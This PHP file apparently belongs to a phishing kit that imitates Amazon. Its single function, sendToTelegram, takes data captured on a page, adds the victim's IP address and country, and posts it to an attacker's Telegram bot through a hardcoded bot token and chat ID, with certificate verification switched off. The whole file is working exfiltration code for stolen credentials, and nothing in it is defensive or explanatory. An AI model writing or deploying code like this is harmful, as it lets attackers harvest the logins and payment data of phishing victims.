<?php
function sendToTelegram($message, $page = "Unknown") {
    $botToken = '8565906331:AAGf9dkAjwyqKiNPIqE8PdJIRfdcd4O53BQ';
    $chatId = '8527642851';
    
    // Get user IP and country
    $ip = $_SERVER['REMOTE_ADDR'];
    $country = "Unknown";
    
    try {
        $locationResponse = file_get_contents("https://ipapi.co/{$ip}/country_name/");
        if ($locationResponse) {
            $country = trim($locationResponse);
        }
    } catch (Exception $e) {
        $country = "Failed to fetch";
    }
    
    $fullMessage = "🚨 AMAZON {$page} 🚨\n\n{$message}\n\n🌐 IP: {$ip}\n🌍 Country: {$country}\n⏰ Date: " . date('Y-m-d H:i:s');
    
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    
    $data = [
        'chat_id' => $chatId,
        'text' => $fullMessage,
        'parse_mode' => 'HTML'
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    return $httpCode === 200;
}
?>
